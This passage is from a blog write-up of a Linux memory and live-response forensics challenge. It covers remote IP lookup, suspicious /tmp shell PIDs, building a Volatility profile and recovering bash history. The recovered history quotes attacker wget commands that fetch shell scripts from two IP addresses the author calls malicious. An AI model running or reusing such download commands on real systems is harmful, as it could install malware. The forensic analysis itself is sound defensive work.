</code></pre><h2 id="q12-uac-gathered-some-data-from-the-second-process-in-q10-what-is-the-remote-ip-address-and-remote-port-that-was-used-in-the-attack" class="relative group">Q12 UAC gathered some data from the second process in Q#10. What is the remote IP address and remote port that was used in the attack? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q12-uac-gathered-some-data-from-the-second-process-in-q10-what-is-the-remote-ip-address-and-remote-port-that-was-used-in-the-attack" aria-label="Ancre">#</a></span></h2>
<p><em>file: uac</em></p>
<p>The gathered datas are in <code>live_response/process/proc/&lt;num_proc&gt;</code>. The <code>environ.txt</code> file contains some interesting informations:</p>
<pre tabindex="0"><code>...
REMOTE_ADDR=116.202.187.77
...
REMOTE_PORT=56590
...
</code></pre><h2 id="q13-which-user-was-responsible-for-executing-the-command-in-q11" class="relative group">Q13 Which user was responsible for executing the command in Q#11? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q13-which-user-was-responsible-for-executing-the-command-in-q11" aria-label="Ancre">#</a></span></h2>
<p><em>file: uac</em></p>
<p>In the Q11 (<code>ps_-ef.txt</code>), we have the response: <code>deamon</code>.</p>
<h2 id="q14-two-suspicious-shell-processes-were-running-from-the-tmp-folder-what-are-their-pids" class="relative group">Q14 Two suspicious shell processes were running from the tmp folder. What are their PIDs? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q14-two-suspicious-shell-processes-were-running-from-the-tmp-folder-what-are-their-pids" aria-label="Ancre">#</a></span></h2>
<p><em>file: uac</em></p>
<p>Like in the Q10, we can link the location with the PIDs in <code>lsof_-nPl.txt</code> and filter using grep:</p>
<pre tabindex="0"><code># grep -E &#39;sh.*\/tmp&#39; live_response/process/lsof_-nPl.txt
COMMAND     PID   TID     USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
sh        15853              1  cwd       DIR               8,17    12288       4059 /tmp
sh        20645              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
sh        20645              1   10r      REG               8,17     9087     528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
sh        21785              1  cwd       DIR               8,17    12288       4059 /tmp
</code></pre><p>Two new PIDs appear: <code>15853</code> and <code>21785</code> (20645 was already known).</p>
<h2 id="q15-what-is-the-mac-address-of-the-captured-memory" class="relative group">Q15 What is the MAC address of the captured memory? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q15-what-is-the-mac-address-of-the-captured-memory" aria-label="Ancre">#</a></span></h2>
<p><em>file: ubuntu.20211208.mem</em></p>
<p>The most technical part of the challenge begin here. Some of the information may be incorrect, I have recently learned these concepts and I am not comfortable with creating profiles and kernel specification yet. I think you could answer the next two questions with <code>strings|grep</code> but it is more exctiting to create a custom profile.</p>
<p>Since the dump was not made on a Windows machine, <code>Volatility2</code> can&rsquo;t parse natively the mem file, we have to build our own profile. I follow this tutorial to make the profile: <a href="https://beguier.eu/nicolas/articles/security-tips-3-volatility-linux-profiles.html">Security Post-it #3 – Volatility Linux Profiles</a>.</p>
<p>Using <code>Volatility3</code> you can get the kernel version of the mem dump:</p>
<pre tabindex="0"><code># volatility3 -f ubuntu.20211208.mem banner
Volatility 3 Framework 2.4.2
Progress:  100.00		PDB scanning finished                      
Offset	Banner

0x312001a0	Linux version 5.4.0-1059-azure (buildd@lcy01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #62~18.04.1-Ubuntu SMP Tue Sep 14 17:53:18 UTC 2021 (Ubuntu 5.4.0-1059.62~18.04.1-azure 5.4.140)
</code></pre><p>So this the kernel version is <code>5.4.0-1059-azure</code>,  and it is a <code>Ubuntu 18.04</code>.</p>
<p>Next, go to the linux tool directory in vol2 and modify the <code>KVER</code> variable in <code>Makefile</code> with the kernel version:</p>
<pre tabindex="0"><code># cd volatility/tools/linux

# The KVER variable must contains the kernel version (volatility/tools/linux/Makefile):
KVER ?= 5.4.0-1059-azure
</code></pre><p>Next, run a <code>Docker</code> container using a <code>Ubuntu 18.04</code> image (the Ubuntu version where was dumped the RAM). Note that other Ubuntu version will not work, you have to use the <strong>same</strong> version.</p>
<pre tabindex="0"><code># docker run -it --rm -v $PWD:/volatility ubuntu:18.04 /bin/bash
</code></pre><p>Note that the <code>d#</code> symbol represents the container prompt. <strong>Update</strong> the OS and install the following tools:</p>
<ul>
<li><code>build-essential</code></li>
<li><code>dwarfdump</code></li>
<li><code>make</code></li>
<li><code>zip</code></li>
</ul>
<p>Most important: install <code>linux-image-&lt;kernel_version&gt;</code> and <code>linux-headers-&lt;kernel_version&gt;</code>. For the challenge the packages will be:</p>
<ul>
<li><code>linux-image-5.4.0-1059-azure</code></li>
<li><code>linux-headers-5.4.0-1059-azure</code></li>
</ul>
<p>Once all is installed, go to the <code>volatility</code> directory and build the <code>dwarf-tools</code> file:</p>
<pre tabindex="0"><code>d# cd /volatility
d# make
make -C //lib/modules/5.4.0-1059-azure/build CONFIG_DEBUG_INFO=y M=&#34;/volatility&#34; modules
make[1]: Entering directory &#39;/usr/src/linux-headers-5.4.0-1059-azure&#39;
  CC [M]  /volatility/module.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC [M]  /volatility/module.mod.o
  LD [M]  /volatility/module.ko
make[1]: Leaving directory &#39;/usr/src/linux-headers-5.4.0-1059-azure&#39;
dwarfdump -di module.ko &gt; module.dwarf
make -C //lib/modules/5.4.0-1059-azure/build M=&#34;/volatility&#34; clean
make[1]: Entering directory &#39;/usr/src/linux-headers-5.4.0-1059-azure&#39;
  CLEAN   /volatility/Module.symvers
make[1]: Leaving directory &#39;/usr/src/linux-headers-5.4.0-1059-azure&#39;
</code></pre><p><strong>IMPORTANT: if you encounter an error relative to a missing licence in <code>/volatility/module.c</code>, then add this line at this end of <code>module.c</code>:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_LICENSE</span>(<span style="color:#e6db74">&#34;GPL&#34;</span>);
</span></span></code></pre></div><p>Finnaly, build the profile (<code>Ubuntu-azure.zip</code>):</p>
<pre tabindex="0"><code>d# zip Ubuntu-azure.zip module.dwarf /boot/System.map-5.4.0-1059-azure
</code></pre><p><code>/boot/System.map-5.4.0-1059-azure</code> should exists inside your Docker. If not, you have not installed the right kernel packages. Quit the Docker and copy the <code>Ubuntu-azure.zip</code> file into <code>volatility/plugins/overlays/linux</code>.</p>
<hr>
<p>Do you have built the profile correctly? Let&rsquo;s try to use it in <code>Volatility</code>:</p>
<pre tabindex="0"><code># #display information about vol profiles
# python2 vol.py --info|grep Profile
Volatility Foundation Volatility Framework 2.6.1
Profiles
LinuxUbuntu-azurex64  - A Profile for Linux Ubuntu-azure x64
...
</code></pre><p>If you see <code>LinuxUbuntu-azurex64</code> chances are your profile is valid, let&rsquo;s test it. We are looking for the MAC address of the machine, according to the [vol2 documentation]
(<a href="https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf)">https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf)</a>, <code>linux_ifconfig</code> should give me the answer.</p>
<pre tabindex="0"><code># python2 vol.py -f ubuntu.20211208.mem --profile=LinuxUbuntu-azurex64 linux_ifconfig

Volatility Foundation Volatility Framework 2.6.1
Interface        IP Address           MAC Address        Promiscous Mode
---------------- -------------------- ------------------ ---------------
lo               127.0.0.1            00:00:00:00:00:00  False          
eth0             10.0.0.4             00:22:48:26:3b:16  False    
</code></pre><p>Here we go! The eth0 MAC address is the good answer :)</p>
<h2 id="q16-from-bash-history-the-attacker-downloaded-an-sh-script-what-is-the-name-of-the-file" class="relative group">Q16 From Bash history. The attacker downloaded an sh script. What is the name of the file? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q16-from-bash-history-the-attacker-downloaded-an-sh-script-what-is-the-name-of-the-file" aria-label="Ancre">#</a></span></h2>
<p><em>file: ubuntu.20211208.mem</em></p>
<p><code>linux_bash</code> plugin gives the bash history, let&rsquo;s make a grep on the output:</p>
<pre tabindex="0"><code># python2 vol.py -f ubuntu.20211208.mem --profile=LinuxUbuntu-azurex64 linux_bash|grep -E &#39;(wget |curl ).*\.sh&#39;
Volatility Foundation Volatility Framework 2.6.1
    4205 bash                 2021-12-08 16:12:31 UTC+0000   wget http://88.218.227.141/wget.sh
    4205 bash                 2021-12-08 16:12:31 UTC+0000   wget http://185.191.32.198/unk.sh
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep &#34;.sh
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep &#34;.sh&#34;
    9331 bash                 2021-12-08 16:18:01 UTC+0000   grep curl error_log  | grep &#34;\.sh&#34;
</code></pre><p>Both of the IP are reported as malicious on <a href="https://www.virustotal.com/">VirusTotal</a>, so I think the attacker downloaded at least two malicious files via bash. The only files that matches the pattern is <code>unk.sh</code>.</p>

      </div>
    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      
  <div class="flex">
    
      
      
        
        <img
          class="w-24 h-24 !mt-0 !mb-0 ltr:mr-4 rtl:ml-4 rounded-full"
          width="96"
          height="96"
          alt="nathan.out"
          src="/img/author_hu00bba01d950a59fc7877b060fc60a3bd_21567_192x192_fill_q75_box_smart1.jpg"
        />
      
    
    <div class="place-self-center">
      
        <div class="text-[0.6rem] leading-3 text-neutral-500 dark:text-neutral-400 uppercase">
          Auteur
        </div>
        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
          nathan.out
        </div>
      
      
      <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/nathan-out"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          >

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</a
        >
      
    
  </div>

</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
        </span>
        <span>
          
            <a class="flex text-right group" href="/write-up/cyberdefenders-digital-forensics-nintendohunt/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Cyberdefenders · Digital Forensics · NintendoHunt</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-05-03 13:20:01 &#43;0200 CEST">3 mai 2023</time>
                  
                </span>
              </span>
              <span
                class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div
            class="absolute top-[100vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"
          >
            <a
              href="#the-top"
              class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
              aria-label="Faire défiler jusqu&#39;au bas de la page"
              title="Faire défiler jusqu&#39;au bas de la page"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2023
            nathan.out
        </p>
      
      
      
    </div>
    
    
      <div
        class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"
      >
        <button
          id="appearance-switcher"
          class="w-12 h-12 "
          type="button"
          title="Passer au thème sombre"
        >
          <span class="inline dark:hidden">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>

</span>
          <span class="hidden dark:inline">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>

</span>
        </button>
      </div>
    
  </div>
  
  
</footer>
<div
  id="search-wrapper"
  class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
  data-url="https://nathan-out.github.io/"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2"
          placeholder="Rechercher"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
        title="Fermer (Esc)"
      >
        

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
